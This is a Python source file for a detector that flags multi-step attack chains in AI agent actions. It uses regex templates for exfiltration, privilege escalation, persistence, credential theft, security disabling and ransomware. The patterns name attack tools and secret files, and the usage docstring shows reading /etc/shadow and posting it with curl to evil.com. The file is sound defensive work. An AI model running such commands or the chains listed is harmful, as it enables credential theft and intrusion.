"""Agent Exploit Chain Detector — detects multi-step attack sequences.

Analyzes sequences of agent actions to identify attack chains such as:
- Data exfiltration: read sensitive file → encode → send to external URL
- Privilege escalation: enumerate permissions → exploit vulnerability → elevate
- Persistence: create file → modify startup → install backdoor
- Reconnaissance → exploitation → lateral movement chains
- Supply chain: install package → modify dependency → inject payload

Each chain is defined as an ordered set of action stages with match patterns.
The detector maintains a sliding window of recent actions and continuously
evaluates whether observed actions match known attack chain templates.
"""

from __future__ import annotations

import re
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any


class ChainSeverity(str, Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"


class ActionType(str, Enum):
    COMMAND = "command"
    FILE_READ = "file_read"
    FILE_WRITE = "file_write"
    NETWORK = "network"
    PACKAGE = "package"
    CODE_EXEC = "code_exec"
    CREDENTIAL = "credential"
    DISCOVERY = "discovery"
    ENCODING = "encoding"
    PROCESS = "process"
    REGISTRY = "registry"
    PERMISSION = "permission"


@dataclass
class AgentAction:
    """A single observed agent action."""

    action_type: ActionType
    tool_name: str
    target: str
    args: dict[str, Any] = field(default_factory=dict)
    timestamp: float = field(default_factory=time.time)
    session_id: str = ""
    raw_input: str = ""

    @property
    def key(self) -> str:
        return f"{self.action_type.value}:{self.tool_name}:{self.target}"


@dataclass
class ChainStage:
    """One stage in an attack chain template."""

    name: str
    action_types: list[ActionType]
    patterns: list[str]  # Regex patterns matching target/args
    description: str
    required: bool = True  # False = optional stage (strengthens chain if present)

    def matches(self, action: AgentAction) -> bool:
        if action.action_type not in self.action_types:
            return False
        search_text = f"{action.tool_name} {action.target} {action.raw_input}"
        return any(re.search(p, search_text, re.IGNORECASE) for p in self.patterns)


@dataclass
class ChainTemplate:
    """An attack chain template — ordered sequence of stages."""

    chain_id: str
    name: str
    description: str
    severity: ChainSeverity
    mitre_techniques: list[str]
    stages: list[ChainStage]
    max_window_seconds: int = 300  # Max time between first and last stage
    min_stages_to_trigger: int = 0  # 0 = all required stages needed

    def __post_init__(self) -> None:
        if self.min_stages_to_trigger == 0:
            self.min_stages_to_trigger = sum(1 for s in self.stages if s.required)


@dataclass
class ChainMatch:
    """A detected attack chain match."""

    chain: ChainTemplate
    matched_stages: list[tuple[ChainStage, AgentAction]]
    confidence: float  # 0.0 – 1.0
    start_time: float
    end_time: float
    session_id: str

    @property
    def severity(self) -> str:
        return self.chain.severity.value

    @property
    def duration_seconds(self) -> float:
        return self.end_time - self.start_time

    def to_dict(self) -> dict[str, Any]:
        return {
            "chain_id": self.chain.chain_id,
            "chain_name": self.chain.name,
            "severity": self.severity,
            "confidence": round(self.confidence, 2),
            "mitre_techniques": self.chain.mitre_techniques,
            "stages_matched": len(self.matched_stages),
            "stages_total": len(self.chain.stages),
            "duration_seconds": round(self.duration_seconds, 1),
            "actions": [
                {
                    "stage": stage.name,
                    "action_type": action.action_type.value,
                    "tool": action.tool_name,
                    "target": action.target,
                }
                for stage, action in self.matched_stages
            ],
        }


@dataclass
class ChainDetectionResult:
    """Result of chain detection analysis."""

    chains_detected: list[ChainMatch] = field(default_factory=list)
    actions_analyzed: int = 0
    scan_time_ms: float = 0.0

    @property
    def is_safe(self) -> bool:
        return len(self.chains_detected) == 0

    @property
    def max_severity(self) -> str:
        if not self.chains_detected:
            return "none"
        order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
        return min(self.chains_detected, key=lambda c: order.get(c.severity, 4)).severity

    def to_dict(self) -> dict[str, Any]:
        return {
            "is_safe": self.is_safe,
            "max_severity": self.max_severity,
            "chains_detected": len(self.chains_detected),
            "actions_analyzed": self.actions_analyzed,
            "scan_time_ms": round(self.scan_time_ms, 1),
            "chains": [c.to_dict() for c in self.chains_detected],
        }


# ══════════════════════════════════════════════════════════════════════════
# Built-in Attack Chain Templates
# ══════════════════════════════════════════════════════════════════════════

BUILTIN_CHAINS: list[ChainTemplate] = [
    # ── Data Exfiltration Chains ──────────────────────────────────────
    ChainTemplate(
        chain_id="CHAIN-001",
        name="File Read → Encode → Exfiltrate",
        description="Classic data exfiltration: reads sensitive file, encodes content, sends to external endpoint",
        severity=ChainSeverity.CRITICAL,
        mitre_techniques=["T1005", "T1132", "T1041"],
        stages=[
            ChainStage(
                name="read_sensitive",
                action_types=[ActionType.FILE_READ],
                patterns=[
                    r"(\.env|\.ssh|\.aws|credentials|secrets?|tokens?|passw|shadow|id_rsa|\.pem)",
                    r"(/etc/passwd|/etc/shadow|/etc/hosts|\.git/config)",
                    r"(database\.yml|wp-config|settings\.py|\.htpasswd)",
                ],
                description="Read a sensitive file",
            ),
            ChainStage(
                name="encode",
                action_types=[ActionType.ENCODING, ActionType.CODE_EXEC, ActionType.COMMAND],
                patterns=[
                    r"(base64|b64encode|btoa|encode|compress|gzip|tar|zip)",
                    r"(hex|xxd|od\s)",
                ],
                description="Encode or compress data",
                required=False,
            ),
            ChainStage(
                name="exfiltrate",
                action_types=[ActionType.NETWORK, ActionType.COMMAND],
                patterns=[
                    r"(curl|wget|fetch|http|requests?\.(get|post|put))",
                    r"(ngrok|hookbin|requestbin|pipedream|burpcollaborator)",
                    r"(webhook|exfil|collect|receive|upload)",
                    r"(nc\s|ncat\s|netcat)",
                ],
                description="Send data to external endpoint",
            ),
        ],
    ),
    ChainTemplate(
        chain_id="CHAIN-002",
        name="Database Dump → Exfiltrate",
        description="Extracts database contents and exfiltrates via network",
        severity=ChainSeverity.CRITICAL,
        mitre_techniques=["T1005", "T1048"],
        stages=[
            ChainStage(
                name="db_access",
                action_types=[ActionType.COMMAND, ActionType.CODE_EXEC],
                patterns=[
                    r"(mysqldump|pg_dump|mongodump|sqlite3|psql|mysql\s)",
                    r"(SELECT\s.*FROM|COPY\s.*TO|\\copy|\.dump)",
                ],
                description="Database extraction",
            ),
            ChainStage(
                name="exfiltrate",
                action_types=[ActionType.NETWORK, ActionType.COMMAND],
                patterns=[
                    r"(curl|wget|fetch|scp|rsync|ftp|sftp)",
                    r"(ngrok|hookbin|requestbin|pipedream)",
                ],
                description="Network exfiltration",
            ),
        ],
    ),
    ChainTemplate(
        chain_id="CHAIN-003",
        name="Clipboard/Screen Capture → Exfiltrate",
        description="Captures screen or clipboard content and sends externally",
        severity=ChainSeverity.HIGH,
        mitre_techniques=["T1113", "T1115", "T1041"],
        stages=[
            ChainStage(
                name="capture",
                action_types=[ActionType.COMMAND, ActionType.CODE_EXEC],
                patterns=[
                    r"(screenshot|screencapture|scrot|xdotool|xclip|pbcopy|pbpaste)",
                    r"(pyautogui|pyscreeze|pillow.*grab|ImageGrab)",
                    r"(clipboard|xdg-open|xsel)",
                ],
                description="Capture screen or clipboard",
            ),
            ChainStage(
                name="exfiltrate",
                action_types=[ActionType.NETWORK, ActionType.COMMAND],
                patterns=[
                    r"(curl|wget|fetch|upload|http|requests?\.post)",
                ],
                description="Send captured data externally",
            ),
        ],
    ),
    # ── Privilege Escalation Chains ───────────────────────────────────
    ChainTemplate(
        chain_id="CHAIN-004",
        name="Enumerate → Exploit → Elevate",
        description="Discovers permissions/vulnerabilities, then escalates privileges",
        severity=ChainSeverity.CRITICAL,
        mitre_techniques=["T1087", "T1068", "T1548"],
        stages=[
            ChainStage(
                name="enumerate",
                action_types=[ActionType.DISCOVERY, ActionType.COMMAND],
                patterns=[
                    r"(whoami|id\s|groups|sudo\s-l|find.*-perm.*suid)",
                    r"(net\s+user|net\s+localgroup|icacls|Get-Acl)",
                    r"(cat\s+/etc/sudoers|getent|enum4linux)",
                    r"(linpeas|winpeas|sherlock|powerup)",
                ],
                description="Enumerate permissions and vulnerabilities",
            ),
            ChainStage(
                name="exploit",
                action_types=[ActionType.COMMAND, ActionType.CODE_EXEC, ActionType.FILE_WRITE],
                patterns=[
                    r"(exploit|payload|shellcode|reverse.?shell|bind.?shell)",
                    r"(buffer.?overflow|stack.?smash|rop.?chain|use.?after.?free)",
                    r"(CVE-\d{4}-\d+|0day|zero.?day)",
                    r"(msfconsole|metasploit|msfvenom|cobalt.?strike)",
                ],
                description="Exploit vulnerability",
                required=False,
            ),
            ChainStage(
                name="elevate",
                action_types=[ActionType.COMMAND, ActionType.PERMISSION],
                patterns=[
                    r"(sudo\s|su\s+-|runas\s|pkexec|doas\s)",
                    r"(chmod\s+[47]|chown\s+root|setuid|setgid)",
                    r"(net\s+localgroup\s+administrators|Add-LocalGroupMember)",
                    r"(token.*impersonat|SeDebugPrivilege|SeImpersonate)",
                ],
                description="Elevate privileges",
            ),
        ],
    ),
    ChainTemplate(
        chain_id="CHAIN-005",
        name="UAC Bypass Chain",
        description="Windows UAC bypass via DLL hijacking or registry manipulation",
        severity=ChainSeverity.HIGH,
        mitre_techniques=["T1548.002", "T1574.001"],
        stages=[
            ChainStage(
                name="discover_target",
                action_types=[ActionType.DISCOVERY, ActionType.COMMAND],
                patterns=[
                    r"(reg\s+query|Get-ItemProperty|sigcheck|autoElevate)",
                    r"(accesschk|icacls|findstr.*manifest)",
                ],
                description="Find auto-elevate binary or writable path",
            ),
            ChainStage(
                name="place_payload",
                action_types=[ActionType.FILE_WRITE],
                patterns=[
                    r"(\.dll|\.exe|\.com|\.bat|\.ps1|\.vbs)",
                    r"(System32|SysWOW64|Windows\\Temp)",
                    r"(hijack|sideload|proxy.?dll)",
                ],
                description="Place malicious DLL/binary",
            ),
            ChainStage(
                name="trigger",
                action_types=[ActionType.COMMAND, ActionType.CODE_EXEC],
                patterns=[
                    r"(eventvwr|fodhelper|computerdefaults|sdclt|cmstp)",
                    r"(slui|wsreset|changepk)",
                ],
                description="Trigger auto-elevate binary",
            ),
        ],
    ),
    # ── Persistence Chains ────────────────────────────────────────────
    ChainTemplate(
        chain_id="CHAIN-006",
        name="Download → Install → Persist",
        description="Downloads payload, installs it, and sets up persistence mechanism",
        severity=ChainSeverity.CRITICAL,
        mitre_techniques=["T1105", "T1547", "T1053"],
        stages=[
            ChainStage(
                name="download",
                action_types=[ActionType.NETWORK, ActionType.COMMAND],
                patterns=[
                    r"(curl|wget|Invoke-WebRequest|certutil.*urlcache)",
                    r"(download|fetch|pull|retrieve)",
                    r"(bitsadmin.*transfer)",
                ],
                description="Download payload from remote",
            ),
            ChainStage(
                name="install",
                action_types=[ActionType.FILE_WRITE, ActionType.COMMAND],
                patterns=[
                    r"(chmod\s+\+x|install\s|mv\s.*bin|cp\s.*bin)",
                    r"(pip\s+install|npm\s+install|gem\s+install)",
                    r"(\.exe|\.dll|\.so|\.dylib)",
                ],
                description="Install payload",
            ),
            ChainStage(
                name="persist",
                action_types=[ActionType.COMMAND, ActionType.FILE_WRITE, ActionType.REGISTRY],
                patterns=[
                    r"(crontab|systemctl\s+enable|rc\.local|\.bashrc|\.profile)",
                    r"(HKLM.*\\Run|HKCU.*\\Run|CurrentVersion.*\\Run)",
                    r"(schtasks\s+/create|at\s+\d|launchctl|launchd)",
                    r"(startup\s+folder|autostart|init\.d|systemd.*service)",
                    r"(reg\s+add.*Run|New-ItemProperty.*Run)",
                ],
                description="Establish persistence",
            ),
        ],
    ),
    ChainTemplate(
        chain_id="CHAIN-007",
        name="Backdoor User Account",
        description="Creates new user account and adds to privileged group",
        severity=ChainSeverity.CRITICAL,
        mitre_techniques=["T1136", "T1098"],
        stages=[
            ChainStage(
                name="create_user",
                action_types=[ActionType.COMMAND, ActionType.CODE_EXEC],
                patterns=[
                    r"(useradd|adduser|net\s+user\s+\S+\s+/add|New-LocalUser)",
                ],
                description="Create new user account",
            ),
            ChainStage(
                name="add_to_group",
                action_types=[ActionType.COMMAND, ActionType.PERMISSION],
                patterns=[
                    r"(usermod.*-aG.*(sudo|wheel|admin)|net\s+localgroup\s+admin)",
                    r"(Add-LocalGroupMember|gpasswd\s+-a)",
                ],
                description="Add user to privileged group",
            ),
        ],
    ),
    # ── Credential Access Chains ──────────────────────────────────────
    ChainTemplate(
        chain_id="CHAIN-008",
        name="Credential Harvesting → Lateral Movement",
        description="Extracts credentials then uses them to move laterally",
        severity=ChainSeverity.CRITICAL,
        mitre_techniques=["T1003", "T1021", "T1550"],
        stages=[
            ChainStage(
                name="harvest",
                action_types=[ActionType.CREDENTIAL, ActionType.COMMAND],
                patterns=[
                    r"(mimikatz|sekurlsa|lsadump|hashdump|procdump.*lsass)",
                    r"(pypykatz|impacket.*secretsdump|crackmapexec.*--sam)",
                    r"(LaZagne|credential.?dump|Get-Credential)",
                    r"(cat.*/etc/shadow|unshadow|john|hashcat)",
                ],
                description="Harvest credentials",
            ),
            ChainStage(
                name="lateral_move",
                action_types=[ActionType.NETWORK, ActionType.COMMAND],
                patterns=[
                    r"(psexec|wmiexec|smbexec|atexec|dcomexec)",
                    r"(evil-winrm|winrs|Enter-PSSession)",
                    r"(ssh\s+.*@|scp\s+.*@|rsync.*@)",
                    r"(pass.?the.?hash|pth|overpass|golden.?ticket|silver.?ticket)",
                    r"(rdp|xfreerdp|rdesktop|mstsc)",
                ],
                description="Move laterally using harvested creds",
            ),
        ],
    ),
    ChainTemplate(
        chain_id="CHAIN-009",
        name="Keylogger Install → Credential Capture",
        description="Installs keylogger to capture credentials",
        severity=ChainSeverity.HIGH,
        mitre_techniques=["T1056.001", "T1005"],
        stages=[
            ChainStage(
                name="install_logger",
                action_types=[ActionType.FILE_WRITE, ActionType.CODE_EXEC, ActionType.COMMAND],
                patterns=[
                    r"(keylog|keyboard.*hook|pynput|SetWindowsHookEx|GetAsyncKeyState)",
                    r"(xinput.*test|xdotool.*key|logkeys|keysniffer)",
                ],
                description="Install keylogger",
            ),
            ChainStage(
                name="capture_output",
                action_types=[ActionType.FILE_READ, ActionType.COMMAND],
                patterns=[
                    r"(keylog.*output|captured.*keys|keystroke|\.log$)",
                ],
                description="Read captured keystrokes",
            ),
        ],
    ),
    # ── Supply Chain Chains ───────────────────────────────────────────
    ChainTemplate(
        chain_id="CHAIN-010",
        name="Dependency Confusion Attack",
        description="Publishes malicious package to shadow internal dependency",
        severity=ChainSeverity.CRITICAL,
        mitre_techniques=["T1195.001"],
        stages=[
            ChainStage(
                name="enumerate_deps",
                action_types=[ActionType.FILE_READ, ActionType.DISCOVERY],
                patterns=[
                    r"(requirements\.txt|package\.json|go\.mod|Cargo\.toml|Gemfile)",
                    r"(pip\s+list|npm\s+list|go\s+list|cargo\s+tree)",
                ],
                description="Enumerate project dependencies",
            ),
            ChainStage(
                name="create_package",
                action_types=[ActionType.FILE_WRITE, ActionType.COMMAND],
                patterns=[
                    r"(setup\.py|pyproject\.toml|package\.json.*\"name\")",
                    r"(twine\s+upload|npm\s+publish|cargo\s+publish)",
                    r"(pip\s+install.*--index-url|--extra-index-url)",
                ],
                description="Create or publish rogue package",
            ),
        ],
    ),
    ChainTemplate(
        chain_id="CHAIN-011",
        name="CI/CD Pipeline Poisoning",
        description="Modifies CI/CD config to inject malicious steps",
        severity=ChainSeverity.CRITICAL,
        mitre_techniques=["T1195.002"],
        stages=[
            ChainStage(
                name="read_pipeline",
                action_types=[ActionType.FILE_READ, ActionType.DISCOVERY],
                patterns=[
                    r"(\.github/workflows|\.gitlab-ci|Jenkinsfile|\.circleci|\.travis)",
                    r"(azure-pipelines|bitbucket-pipelines|cloudbuild)",
                ],
                description="Read CI/CD configuration",
            ),
            ChainStage(
                name="modify_pipeline",
                action_types=[ActionType.FILE_WRITE],
                patterns=[
                    r"(\.github/workflows|\.gitlab-ci|Jenkinsfile|\.circleci|\.travis)",
                    r"(azure-pipelines|bitbucket-pipelines|cloudbuild)",
                ],
                description="Modify CI/CD pipeline",
            ),
        ],
    ),
    # ── Reconnaissance → Attack Chains ────────────────────────────────
    ChainTemplate(
        chain_id="CHAIN-012",
        name="Port Scan → Service Exploit",
        description="Scans for open ports then exploits discovered services",
        severity=ChainSeverity.HIGH,
        mitre_techniques=["T1046", "T1190"],
        stages=[
            ChainStage(
                name="scan",
                action_types=[ActionType.DISCOVERY, ActionType.COMMAND],
                patterns=[
                    r"(nmap|masscan|zmap|rustscan|netstat.*LISTEN)",
                    r"(port.*scan|service.*enum|banner.*grab)",
                ],
                description="Port/service scanning",
            ),
            ChainStage(
                name="exploit",
                action_types=[ActionType.COMMAND, ActionType.CODE_EXEC, ActionType.NETWORK],
                patterns=[
                    r"(exploit|sqlmap|nikto|nuclei|burp|dirbust)",
                    r"(msfconsole|metasploit|searchsploit)",
                    r"(CVE-\d{4}-\d+|remote.?code.?exec|rce)",
                ],
                description="Exploit discovered service",
            ),
        ],
    ),
    # ── Defense Evasion Chains ────────────────────────────────────────
    ChainTemplate(
        chain_id="CHAIN-013",
        name="Disable Security → Execute Payload",
        description="Disables security tools before executing malicious payload",
        severity=ChainSeverity.CRITICAL,
        mitre_techniques=["T1562.001", "T1059"],
        stages=[
            ChainStage(
                name="disable_security",
                action_types=[ActionType.COMMAND, ActionType.REGISTRY],
                patterns=[
                    r"(Set-MpPreference.*DisableRealtimeMonitoring)",
                    r"(systemctl\s+stop.*(apparmor|selinux|firewall|antivirus))",
                    r"(ufw\s+disable|iptables\s+-F|netsh.*firewall.*off)",
                    r"(sc\s+stop|net\s+stop.*(defender|mcshield|avast|norton))",
                    r"(AMSI.*bypass|amsiInitFailed|Reflection.*amsi)",
                    r"(setenforce\s+0|disable.*selinux)",
                ],
                description="Disable security controls",
            ),
            ChainStage(
                name="execute",
                action_types=[ActionType.COMMAND, ActionType.CODE_EXEC],
                patterns=[
                    r"(powershell.*-enc|IEX|Invoke-Expression|iex\()",
                    r"(bash\s+-c|python\s+-c|ruby\s+-e|perl\s+-e)",
                    r"(eval|exec|system|spawn|popen)",
                    r"(\.exe|\.dll|\.so|\.ps1|\.bat|\.vbs|\.hta)",
                ],
                description="Execute payload",
            ),
        ],
    ),
    ChainTemplate(
        chain_id="CHAIN-014",
        name="Log Tampering Chain",
        description="Clears logs or modifies audit trail to cover tracks",
        severity=ChainSeverity.HIGH,
        mitre_techniques=["T1070.001", "T1070.003"],
        stages=[
            ChainStage(
                name="malicious_action",
                action_types=[ActionType.COMMAND, ActionType.CODE_EXEC, ActionType.FILE_WRITE],
                patterns=[r".*"],  # Any action before log clearing
                description="Perform malicious action",
            ),
            ChainStage(
                name="clear_logs",
                action_types=[ActionType.COMMAND, ActionType.FILE_WRITE],
                patterns=[
                    r"(wevtutil\s+cl|Clear-EventLog|Remove-EventLog)",
                    r"(rm\s+.*\.log|truncate.*\.log|>\s*/var/log)",
                    r"(history\s+-c|unset\s+HISTFILE|HISTSIZE=0)",
                    r"(shred|wipe|srm|secure.?delete)",
                    r"(journalctl.*--rotate.*--vacuum)",
                ],
                description="Clear logs or audit trail",
            ),
        ],
    ),
    # ── Impact Chains ─────────────────────────────────────────────────
    ChainTemplate(
        chain_id="CHAIN-015",
        name="Ransomware Chain",
        description="Enumerates files, encrypts them, drops ransom note",
        severity=ChainSeverity.CRITICAL,
        mitre_techniques=["T1486", "T1083"],
        stages=[
            ChainStage(
                name="enumerate_files",
                action_types=[ActionType.DISCOVERY, ActionType.COMMAND],
                patterns=[
                    r"(find\s+.*-name|dir\s+/s|Get-ChildItem.*-Recurse)",
                    r"(\.(doc|xls|pdf|jpg|png|sql|db|bak))",
                ],
                description="Enumerate valuable files",
            ),
            ChainStage(
                name="encrypt",
                action_types=[ActionType.CODE_EXEC, ActionType.COMMAND],
                patterns=[
                    r"(encrypt|cipher|openssl\s+enc|gpg\s+-c|AES|RSA)",
                    r"(cryptography|Crypto\.Cipher|pycryptodome)",
                ],
                description="Encrypt files",
            ),
            ChainStage(
                name="ransom_note",
                action_types=[ActionType.FILE_WRITE],
                patterns=[
                    r"(readme.*ransom|decrypt.*instruction|pay.*bitcoin)",
                    r"(\.locked|\.encrypted|\.crypto|\.crypt)",
                    r"(ransom|bitcoin|monero|wallet|btc\s+address)",
                ],
                description="Drop ransom note",
                required=False,
            ),
        ],
    ),
]


# ══════════════════════════════════════════════════════════════════════════
# Action Classifier
# ══════════════════════════════════════════════════════════════════════════

# Patterns to classify raw tool calls into ActionTypes
_ACTION_CLASSIFIERS: list[tuple[ActionType, list[str]]] = [
    (ActionType.FILE_READ, [
        r"read_file|cat\s|head\s|tail\s|less\s|more\s|type\s|Get-Content",
        r"open\(.*['\"]r",
    ]),
    (ActionType.FILE_WRITE, [
        r"write_file|echo\s.*>|tee\s|Set-Content|Out-File",
        r"open\(.*['\"]w|open\(.*['\"]a",
        r"cp\s|mv\s|copy\s|move\s|rename\s",
    ]),
    (ActionType.NETWORK, [
        r"curl\s|wget\s|fetch|http|requests?\.|urllib",
        r"socket|nc\s|ncat|netcat|telnet|ssh\s|scp\s|rsync",
        r"Invoke-WebRequest|Invoke-RestMethod|Test-NetConnection",
    ]),
    (ActionType.COMMAND, [
        r"bash|sh\s+-c|cmd\s|powershell|pwsh|exec|system|popen|subprocess",
    ]),
    (ActionType.CODE_EXEC, [
        r"eval|exec\(|compile\(|__import__|importlib",
        r"python\s+-c|ruby\s+-e|perl\s+-e|node\s+-e",
    ]),
    (ActionType.CREDENTIAL, [
        r"mimikatz|sekurlsa|hashdump|lsadump|procdump|LaZagne|pypykatz",
        r"credential|password|passwd|shadow|sam\s|ntds",
    ]),
    (ActionType.DISCOVERY, [
        r"whoami|id\s|groups\s|net\s+user|net\s+group|ipconfig|ifconfig",
        r"nmap|masscan|portscan|netstat|ss\s+-|arp\s",
        r"find\s+.*-perm|Get-Process|tasklist|ps\s+aux",
    ]),
    (ActionType.ENCODING, [
        r"base64|b64encode|btoa|atob|hex|xxd|certutil.*encode",
    ]),
    (ActionType.PROCESS, [
        r"kill\s|pkill|taskkill|Stop-Process|start\s|spawn",
    ]),
    (ActionType.REGISTRY, [
        r"reg\s+(add|query|delete)|regedit|New-ItemProperty|Get-ItemProperty",
        r"HKLM|HKCU|HKEY_",
    ]),
    (ActionType.PERMISSION, [
        r"chmod|chown|chgrp|icacls|cacls|Set-Acl|takeown",
        r"setfacl|umask",
    ]),
    (ActionType.PACKAGE, [
        r"pip\s+install|npm\s+install|gem\s+install|cargo\s+install|go\s+get",
        r"apt\s+install|yum\s+install|brew\s+install|choco\s+install",
    ]),
]

_COMPILED_CLASSIFIERS: list[tuple[ActionType, list[re.Pattern[str]]]] | None = None


def _get_classifiers() -> list[tuple[ActionType, list[re.Pattern[str]]]]:
    global _COMPILED_CLASSIFIERS
    if _COMPILED_CLASSIFIERS is None:
        _COMPILED_CLASSIFIERS = [
            (atype, [re.compile(p, re.IGNORECASE) for p in patterns])
            for atype, patterns in _ACTION_CLASSIFIERS
        ]
    return _COMPILED_CLASSIFIERS


def classify_action(tool_name: str, target: str, raw_input: str = "") -> ActionType:
    """Classify an agent action into an ActionType based on tool name and target."""
    search = f"{tool_name} {target} {raw_input}"
    for atype, patterns in _get_classifiers():
        for p in patterns:
            if p.search(search):
                return atype
    return ActionType.COMMAND  # Default


# ══════════════════════════════════════════════════════════════════════════
# Chain Detector Engine
# ══════════════════════════════════════════════════════════════════════════


class ChainDetector:
    """Detects multi-step attack chains from sequences of agent actions.

    Usage:
        detector = ChainDetector()

        # Record actions as they happen
        detector.record_action("bash", "cat /etc/shadow")
        detector.record_action("bash", "base64 shadow_data")
        detector.record_action("bash", "curl -X POST https://evil.com/collect -d @encoded")

        # Check for chains
        result = detector.check()
        if not result.is_safe:
            print(f"Attack chain detected: {result.chains_detected[0].chain.name}")

        # Or analyze a batch of actions
        actions = [AgentAction(...), AgentAction(...)]
        result = detector.analyze_sequence(actions)
    """

    def __init__(
        self,
        chains: list[ChainTemplate] | None = None,
        max_history: int = 1000,
        window_seconds: int = 600,
    ) -> None:
        self.chains = chains or BUILTIN_CHAINS
        self.max_history = max_history
        self.window_seconds = window_seconds
        self._history: list[AgentAction] = []
        self._session_id: str = ""

    def set_session(self, session_id: str) -> None:
        self._session_id = session_id

    def record_action(
        self,
        tool_name: str,
        target: str,
        raw_input: str = "",
        args: dict[str, Any] | None = None,
        session_id: str = "",
    ) -> ChainDetectionResult:
        """Record an agent action and check for chain matches."""
        action_type = classify_action(tool_name, target, raw_input)
        action = AgentAction(
            action_type=action_type,
            tool_name=tool_name,
            target=target,
            args=args or {},
            raw_input=raw_input or f"{tool_name} {target}",
            session_id=self._session_id,
        )
        self._history.append(action)

        # Trim history
        if len(self._history) > self.max_history:
            self._history = self._history[-self.max_history:]

        return self.check()

    def check(self) -> ChainDetectionResult:
        """Check current action history for chain matches."""
        return self.analyze_sequence(self._history)

    def analyze_sequence(self, actions: list[AgentAction]) -> ChainDetectionResult:
        """Analyze a sequence of actions for attack chain matches."""
        start = time.time()
        matches: list[ChainMatch] = []

        for chain in self.chains:
            chain_match = self._match_chain(chain, actions)
            if chain_match is not None:
                matches.append(chain_match)

        elapsed = (time.time() - start) * 1000
        return ChainDetectionResult(
            chains_detected=matches,
            actions_analyzed=len(actions),
            scan_time_ms=elapsed,
        )

    def _match_chain(
        self, chain: ChainTemplate, actions: list[AgentAction]
    ) -> ChainMatch | None:
        """Try to match a chain template against a sequence of actions."""
        if not actions:
            return None

        # Try each action as potential start of the chain
        for start_idx in range(len(actions)):
            result = self._try_chain_from(chain, actions, start_idx)
            if result is not None:
                return result
        return None

    def _try_chain_from(
        self,
        chain: ChainTemplate,
        actions: list[AgentAction],
        start_idx: int,
    ) -> ChainMatch | None:
        """Try to match chain starting from a specific action index."""
        matched: list[tuple[ChainStage, AgentAction]] = []
        stage_idx = 0
        first_time: float | None = None

        for action_idx in range(start_idx, len(actions)):
            if stage_idx >= len(chain.stages):
                break

            action = actions[action_idx]
            stage = chain.stages[stage_idx]

            if stage.matches(action):
                if first_time is None:
                    first_time = action.timestamp
                # Check time window
                if action.timestamp - first_time > chain.max_window_seconds:
                    return None

                matched.append((stage, action))
                stage_idx += 1
            elif not stage.required:
                # Skip optional stage — try next stage with same action
                stage_idx += 1
                if stage_idx < len(chain.stages) and chain.stages[stage_idx].matches(action):
                    if first_time is None:
                        first_time = action.timestamp
                    matched.append((chain.stages[stage_idx], action))
                    stage_idx += 1

        # Check if enough stages matched
        required_matched = sum(
            1 for stage, _ in matched if stage.required
        )
        total_required = sum(1 for s in chain.stages if s.required)

        if required_matched < total_required:
            return None

        if len(matched) < chain.min_stages_to_trigger:
            return None

        # Calculate confidence
        total_stages = len(chain.stages)
        matched_count = len(matched)
        confidence = matched_count / total_stages

        # Boost confidence if all required stages matched
        if required_matched == total_required:
            confidence = max(confidence, 0.8)

        start_time = matched[0][1].timestamp
        end_time = matched[-1][1].timestamp

        return ChainMatch(
            chain=chain,
            matched_stages=matched,
            confidence=confidence,
            start_time=start_time,
            end_time=end_time,
            session_id=self._session_id,
        )

    def clear_history(self) -> None:
        """Clear all recorded actions."""
        self._history.clear()

    def get_history(self) -> list[AgentAction]:
        """Return a copy of the action history."""
        return list(self._history)

    @property
    def history_size(self) -> int:
        return len(self._history)

    @property
    def chain_count(self) -> int:
        return len(self.chains)
